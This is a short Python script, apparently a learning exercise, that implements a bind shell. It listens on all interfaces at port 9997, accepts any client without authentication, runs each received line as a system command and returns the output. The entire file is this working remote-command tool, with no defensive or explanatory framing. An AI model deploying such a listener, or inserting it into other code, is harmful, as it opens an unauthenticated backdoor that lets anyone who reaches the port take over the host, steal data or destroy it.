import shlex
import subprocess
import socket
import threading

def handle(client_socket, client_address):
    print(f"[*] Server connect from {client_address[0]}:{client_address[1]}")
    while True:
        raw = client_socket.recv(4096)
        if not raw:
            print(f"[*] {client_address[0]} disconnected")
            break

        command = raw.decode().strip()
        if not command:
            continue

        if command in ("exit", "quit"):
            print(f"[*] Client requested to quit!")
            break

        try:
            output = subprocess.check_output(shlex.split(command), stderr=subprocess.STDOUT)
            
        except subprocess.CalledProcessError as e:
            output = e.output

        client_socket.send(output)
    client_socket.close()

IP = "0.0.0.0"
PORT = 9997

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server.bind((IP, PORT))

server.listen(5)
print(f"[*] Server is listening on {IP}:{PORT}")

while True:
    client_socket, client_address = server.accept()
    thread = threading.Thread(target= handle, args = (client_socket, client_address))
    thread.start()
    
